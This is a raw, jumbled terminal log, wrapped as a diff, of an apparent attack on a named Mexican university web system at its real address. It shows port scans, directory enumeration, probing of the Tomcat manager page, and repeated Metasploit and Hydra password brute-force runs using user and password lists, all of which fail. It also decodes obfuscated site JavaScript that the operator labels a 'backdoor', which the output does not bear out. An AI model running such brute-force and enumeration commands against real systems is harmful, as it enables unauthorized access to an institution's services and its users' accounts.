@@ -1,0 +1,847 @@
+└──╼ $nmap -p 80,443,8000,8009,8080,8443 -sV -sC sito.utslp.edu.mx
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 20:24 CST
+Nmap scan report for sito.utslp.edu.mx (189.254.143.102)
+Host is up (0.32s latency).
+rDNS record for 189.254.143.102: utslp.edu.mx
+
+PORT     STATE    SERVICE    VERSION
+80/tcp   open     http       Apache Tomcat/Coyote JSP engine 1.1
+|_http-server-header: Apache-Coyote/1.1
+443/tcp  open     ssl/http   Apache Tomcat/Coyote JSP engine 1.1
+| ssl-cert: Subject: commonName=*.utslp.edu.mx
+| Subject Alternative Name: DNS:*.utslp.edu.mx, DNS:utslp.edu.mx
+| Not valid before: 2025-03-12T22:57:40
+|_Not valid after:  2026-04-13T22:57:40
+|_http-server-header: Apache-Coyote/1.1
+8000/tcp filtered http-alt
+8009/tcp filtered ajp13
+8080/tcp filtered http-proxy
+8443/tcp filtered https-alt
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.06 seconds
+
+
+ read udp 192.168.0.152:58498->8.8.8.8:53: i/o timeout
+/css                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/css/]
+/docs                 (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/docs/]
+/examples             (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/examples/]
+/fotos                (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/fotos/]
+/host-manager         (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/host-manager/]
+/images               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/images/]
+/index.html           (Status: 200) [Size: 634]
+/javascript           (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/javascript/]
+/jsp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/jsp/]
+/manager              (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/manager/]
+/styles               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/styles/]
+Progress: 4048 / 4615 (87.71%)[ERROR] Get "https://sito.utslp.edu.mx/Research": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/Thumbs.db            (Status: 200) [Size: 154624]
+/tmp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/tmp/]
+Progress: 4614 / 4615 (99.98%)
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://sito.utslp.edu.mx/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              bak,old,sql,tar.gz,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 2281 / 27690 (8.24%)[ERROR] Get "https://sito.utslp.edu.mx/accountants": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/css                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/css/]
+/docs                 (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/docs/]
+Progress: 8597 / 27690 (31.05%)[ERROR] Get "https://sito.utslp.edu.mx/edgy": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/examples             (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/examples/]
+/fotos                (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/fotos/]
+/host-manager         (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/host-manager/]
+/images               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/images/]
+/index.html           (Status: 200) [Size: 634]
+/javascript           (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/javascript/]
+/jsp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/jsp/]
+/manager              (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/manager/]
+/styles               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/styles/]┌─[marcos_os@parrot]─[~]
+
+└──╼ $nikto -h https://sito.utslp.edu.mx/
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ 0 host(s) tested
+
+/Thumbs.db            (Status: 200) [Size: 154624]
+/tmp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/tmp/]
+Progress: 27684 / 27690 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+
+
+rogress: 5445 / 50765 (10.73%)[ERROR] Get "https://sito.utslp.edu.mx/aspx": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/asps.tar": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/css                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/css/]
+/docs                 (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/docs/]
+/examples             (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/examples/]
+/fotos                (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/fotos/]
+/hello.jsp            (Status: 200) [Size: 891]
+/host-manager         (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/host-manager/]
+/images               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/images/]
+/index.jsp            (Status: 200) [Size: 15938]
+/index.html           (Status: 200) [Size: 634]
+/index2.jsp           (Status: 200) [Size: 14224]
+/javascript           (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/javascript/]
+/jsp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/jsp/]
+/manager              (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/manager/]
+Progress: 31280 / 50765 (61.62%)[ERROR] Get "https://sito.utslp.edu.mx/pack.gz": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+ERROR] Get "https://sito.utslp.edu.mx/ppc.xml": dial tcp 189.254.143.102:443: i/o timeout (Client.Timeout exceeded while awaiting headers)
+/styles               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/styles/]
+/Thumbs.db            (Status: 200) [Size: 154624]
+/tmp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/tmp/]
+Progress: 50754 / 50765 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+
+
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set STOP_ON_SUCCESS t
+rue
+STOP_ON_SUCCESS => true
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[-] The host (189.254.143.102:443) was unreachable.
+[-] The host (189.254.143.102:443) was unreachable.
+[-] http://189.254.143.102:443/manager/html - No response
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> 
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "password\|user\|login\|database\|jdbc\|connection" *.jsp
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index2.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $
+
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $nmap --script "http-methods" -p 443 sito.utslp.edu.mx
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-02 08:49 CST
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 8.22 seconds
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $nmap --script "http-enum" -p 443 sito.utslp.edu.mx
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-02 08:49 CST
+Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for sito.utslp.edu.mx (189.254.143.102)
+Host is up (0.024s latency).
+rDNS record for 189.254.143.102: utslp.edu.mx
+
+PORT    STATE SERVICE
+443/tcp open  https
+| http-enum: 
+|   /examples/: Sample scripts
+|   /javascript/sorttable.js: Secunia NSI
+|   /manager/html/upload: Apache Tomcat (401 No Autorizado)
+|_  /manager/html: Apache Tomcat (401 No Autorizado)
+
+─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $curl -k "https://sito.utslp.edu.mx/manager/status"
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 6.0.30 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>The deprecated <tt>manager</tt> role should not be assigned to any
+        user.</li>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
+   </p>
+ </body>
+
+TARGETURI => /manager/html
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SToP_ON_SUCCESS t
+rue
+SToP_ON_SUCCESS => true
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[*] Error: 189.254.143.102: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=189.254.143.102:443 state=error: tlsv1 alert protocol version
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> 
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "password\|user\|login\|database\|jdbc\|connection" *.jsp
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index2.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/css/]
+/docs                 (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/docs/]
+/examples             (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/examples/]
+/fotos                (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/fotos/]
+/hello.jsp            (Status: 200) [Size: 891]
+/host-manager         (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/host-manager/]
+/images               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/images/]
+/index.html           (Status: 200) [Size: 634]
+/index.jsp            (Status: 200) [Size: 15938]
+/index.html           (Status: 200) [Size: 634]
+/index2.jsp           (Status: 200) [Size: 14224]
+/javascript           (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/javascript/]
+/jsp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/jsp/]
+/manager              (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/manager/]
+Progress: 10074 / 18460 (54.57%)^Z
+[1]+  Detenido                gobuster dir -u https://sito.utslp.edu.mx/ -w /usr/share/wordlists/dirb/common.txt -x jsp,html,xml --timeout 45s --delay 1000ms --threads 5
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS/JSS]
+└──╼ $fg
+gobuster dir -u https://sito.utslp.edu.mx/ -w /usr/share/wordlists/dirb/common.txt -x jsp,html,xml --timeout 45s --delay 1000ms --threads 5
+Progress: 10075 / 18460 (54.58%)[ERROR] Get "https://sito.utslp.edu.mx/microsoft.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/midi.jsp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/midi": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/microsoft.xml": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/styles               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/styles/]
+/Thumbs.db            (Status: 200) [Size: 154624]
+/tmp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/tmp/]
+Progress: 18456 / 18460 (99.98%)
+===============================================================
+Finished
+===============================================================
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS/JSS]
+└──╼ $
+
+
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login 
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts sito.utslp.edu.mx
+rhosts => sito.utslp.edu.mx
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rport 443
+rport => 443
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSLversion SSL3
+SSLversion => SSL3
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set targeturi /manager/html
+targeturi => /manager/html
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
+stop_on_success => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set verbose true
+verbose => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[*] Error: 189.254.143.102: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=189.254.143.102:443 state=error: no protocols available
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo]
+└──╼ $# Crea un script para decodificar la función 'f'
+cat > decode.js << 'EOF'
+function f(D) {
+    var p = "aRfguQwJvbc#h l)[W2jkm/op?N!rVisGq=@tB3O4CdeF9n0U(HI_6X]KLM>,DE.-Pxyz15YZ<78AST";
+    var l = "gJvbUWc#,Dh5w*sGq=@tB[!39nO4CuYdeF0a]Kl)iQxZ<7yf2jkSTrVm/oR-Pp?NI_6XLM>E.z18A(H";
+    var F = D.split("").reverse();
+    var E = "";
+    for(cont = 0; cont < F.length; cont++) {
+        for(cont2 = 0; cont2 < l.length; cont2++) {
+            if(l[cont2] == F[cont]) {
+                E = E + "" + p[cont2];
+                break;
+            }
+        }
+    }
+    return E;
+}
+
+// Decodifica strings importantes
+console.log("String 1:", f(")HS(*39YUF?"));
+console.log("String 2:", f("gYhCge*3y3H*Zd3#"));
+EOF
+
+node decode.js
+String 1: Equipo SITO
+String 2: Jose Tono Garcia
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo]
+└──╼ $openssl s_client -connect sito.utslp.edu.mx:443 -showcerts < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -i "subject:\|issuer:\|dns"
+        Issuer: C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", OU = http://certs.starfieldtech.com/repository/, CN = Starfield Secure Certificate Authority - G2
+        Subject: CN = *.utslp.edu.mx
+                DNS:*.utslp.edu.mx, DNS:utslp.edu.mx
+
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo]
+└──╼ $js decode.js 
+Backdoor strings:
+1: Equipo SITO
+2: Jose Tono Garcia
+3: Desarrollador, Lider de Proyecto
+4: Isra Ramirez
+5: Juanjo-c Muniz
+6: Danyel Sp
+
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login 
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts sito.utslp.edu.mx
+rhosts => sito.utslp.edu.mx
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rport 443 
+rport => 443
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSLVERSION TLS1
+SSLVERSION => TLS1
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set targeturi /manager/html
+targeturi => /manager/html
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set verbose true
+verbose => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set THREADS 1
+THREADS => 1
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[*] Error: 189.254.143.102: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=189.254.143.102:443 state=error: tlsv1 alert protocol version
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+console.log("=== ANÁLISIS DE SCRIPTS ===");
+Array.from(document.scripts).forEach((script, index) => {
+    console.log(`Script ${index}:`, script.src || 'inline');
+});
+=== ANÁLISIS DE SCRIPTS === debugger eval code:1:9
+Script 0: https://sito.utslp.edu.mx/javascript/utilities.js debugger eval code:3:13
+Script 1: https://sito.utslp.edu.mx/javascript/jquery/jquery-1.5.1.min.js debugger eval code:3:13
+Script 2: https://sito.utslp.edu.mx/javascript/jquery/jquery-ui-1.8.2.min.js debugger eval code:3:13
+Script 3: inline debugger eval code:3:13
+Script 4: https://sito.utslp.edu.mx/javascript/scriptAnimaciones.js debugger eval code:3:13
+Script 5: inline debugger eval code:3:13
+Script 6: inline
+
+=== CARGANDO BACKDOOR MANUALMENTE === debugger eval code:1:9
+<script src="https://sito.utslp.edu.m…ipt/scriptAnimaciones.js">
+
+✅ Script cargado correctamente debugger eval code:5:13
+Funciones disponibles: debugger eval code:6:13
+C(): undefined debugger eval code:7:13
+A(): undefined debugger eval code:8:13
+z(): undefined debugger eval code:9:13
+y(): undefined debugger eval code:10:13
+C();
+Uncaught ReferenceError: C is not defined
+    <anonymous> debugger eval code:1
+debugger eval code:1:1
+    <anonymous> debugger eval code:1
+document.head.appendChild(script);
+<script src="https://sito.utslp.edu.m…ipt/scriptAnimaciones.js">
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Informaci�n T�ctico Operativo </title>
+
+	<link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+	<br>
+	<table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Hydra]
+└──╼ $hydra -L users_sito.txt -P passes_sito.txt sito.utslp.edu.mx https-get /manager/html
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-02 16:29:21
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 437 login tries (l:19/p:23), ~28 tries per task
+[DATA] attacking http-gets://sito.utslp.edu.mx:443/manager/html
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-02 16:29:53
+
+// Intenta acceder a las variables globales del backdoor
+console.log("=== BUSCANDO VARIABLES DEL BACKDOOR ===");
+console.log("window.f:", window.f);
+console.log("window.C:", window.C);
+console.log("window.A:", window.A);…
+=== BUSCANDO VARIABLES DEL BACKDOOR === debugger eval code:2:9
+window.f: undefined debugger eval code:3:9
+window.C: undefined debugger eval code:4:9
+window.A: undefined debugger eval code:5:9
+window.z: undefined debugger eval code:6:9
+window.y: undefined debugger eval code:7:9
+InstallTrigger is deprecated and will be removed in the future. debugger eval code:11:9
+onmozfullscreenchange is deprecated. debugger eval code:11:9
+onmozfullscreenerror is deprecated. debugger eval code:11:9
+Ahora presiona Ctrl+Shift+X para ver si detecta el evento debugger eval code:31:9
+undefined
+Ctrl+Shift + X Presionado
+Key sequence state: 
+Object { o: undefined, m: undefined, v: undefined, u: undefined, t: undefined, s: undefined }
+​
+m: undefined
+​
+o: undefined
+​
+s: undefined
+​
+t: undefined
+​
+u: undefined
+​
+v: undefined
+​
+<prototype>: Object { … }
+​​
+__defineGetter__: function __defineGetter__()
+​​
+__defineSetter__: function __defineSetter__()
+​​
+__lookupGetter__: function __lookupGetter__()
+​​
+__lookupSetter__: function __lookupSetter__()
+​​
+__proto__: 
+​​
+constructor: function Object()
+​​
+hasOwnProperty: function hasOwnProperty()
+​​
+isPrototypeOf: function isPrototypeOf()
+​​
+propertyIsEnumerable: function propertyIsEnumerable()
+​​
+toLocaleString: function toLocaleString()
+​​
+toString: function toString()
+​​
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Hydra]
+└──╼ $hydra -L users_sito.txt -P passes_sito.txt sito.utslp.edu.mx https-post-form "/manager/html:j_username=^USER^&j_password=^PASS^:F=Unauthorized"
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-03 12:22:26
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 437 login tries (l:19/p:23), ~28 tries per task
+[DATA] attacking http-post-forms://sito.utslp.edu.mx:443/manager/html:j_username=^USER^&j_password=^PASS^:F=Unauthorized
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "https-get" instead.
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "https-get" instead.
+
+
+valueOf: function valueOf()
+​​
+<get __proto__()>: function __proto__()
+​​
+<set __proto__()>: function __proto__()
+debugger eval code:20:17
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $js decode_backdoor.js 
+Original: )HS(*39YUF? -> Decoded: Equipo SITO
+Original: gYhCge*3y3H*Zd3# -> Decoded: Jose Tono Garcia
+Original: 3]hZX3C_*Zx*CZxYo*PC3xgss3CCgdZp -> Decoded: Desarrollador, Lider de Proyecto
+Original: whygJ9(*I*9dsXyxa*I*-D!z9(*sZXygp-Dz*HQ(S*I*fMf@*]wbYCX93h -> Decoded: copyright 2010 - ISCT <b>Danyel Sp</b> - @dnylsp - SpRanch
+
+$curl -k "https://sito.utslp.edu.mx/examples/jsp/" | grep -o 'href="[^"]*' | cut -d'"' -f2
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 16658  100 16658    0     0  15020      0  0:00:01  0:00:01 --:--:-- 15034
+http://tomcat.apache.org/
+jsp2/el/basic-arithmetic.jsp
+jsp2/el/basic-arithmetic.jsp
+jsp2/el/basic-arithmetic.html
+jsp2/el/basic-arithmetic.html
+jsp2/el/basic-comparisons.jsp
+jsp2/el/basic-comparisons.jsp
+jsp2/el/basic-comparisons.html
+jsp2/el/basic-comparisons.html
+jsp2/el/implicit-objects.jsp?foo=bar
+jsp2/el/implicit-objects.jsp?foo=bar
+jsp2/el/implicit-objects.html
+jsp2/el/implicit-objects.html
+jsp2/el/functions.jsp?foo=JSP+2.0
+jsp2/el/functions.jsp?foo=JSP+2.0
+jsp2/el/functions.html
+jsp2/el/functions.html
+jsp2/simpletag/hello.jsp
+jsp2/simpletag/hello.jsp
+jsp2/simpletag/hello.html
+jsp2/simpletag/hello.html
+jsp2/simpletag/repeat.jsp
+jsp2/simpletag/repeat.jsp
+jsp2/simpletag/repeat.html
+jsp2/simpletag/repeat.html
+jsp2/simpletag/book.jsp
+jsp2/simpletag/book.jsp
+jsp2/simpletag/book.html
+jsp2/simpletag/book.html
+jsp2/tagfiles/hello.jsp
+jsp2/tagfiles/hello.jsp
+jsp2/tagfiles/hello.html
+jsp2/tagfiles/hello.html
+jsp2/tagfiles/panel.jsp
+jsp2/tagfiles/panel.jsp
+jsp2/tagfiles/panel.html
+jsp2/tagfiles/panel.html
+jsp2/tagfiles/products.jsp
+jsp2/tagfiles/products.jsp
+jsp2/tagfiles/products.html
+jsp2/tagfiles/products.html
+jsp2/jspx/basic.jspx
+jsp2/jspx/basic.jspx
+jsp2/jspx/basic.html
+jsp2/jspx/basic.html
+jsp2/jspx/svgexample.html
+jsp2/jspx/svgexample.html
+jsp2/jspx/textRotate.html
+jsp2/jspx/textRotate.html
+jsp2/jspattribute/jspattribute.jsp
+jsp2/jspattribute/jspattribute.jsp
+jsp2/jspattribute/jspattribute.html
+jsp2/jspattribute/jspattribute.html
+jsp2/jspattribute/shuffle.jsp
+jsp2/jspattribute/shuffle.jsp
+jsp2/jspattribute/shuffle.html
+jsp2/jspattribute/shuffle.html
+jsp2/misc/dynamicattrs.jsp
+jsp2/misc/dynamicattrs.jsp
+jsp2/misc/dynamicattrs.html
+jsp2/misc/dynamicattrs.html
+jsp2/misc/config.jsp
+jsp2/misc/config.jsp
+jsp2/misc/config.html
+jsp2/misc/config.html
+num/numguess.jsp
+num/numguess.jsp
+num/numguess.html
+num/numguess.html
+dates/date.jsp
+dates/date.jsp
+dates/date.html
+dates/date.html
+snp/snoop.jsp
+snp/snoop.jsp
+snp/snoop.html
+snp/snoop.html
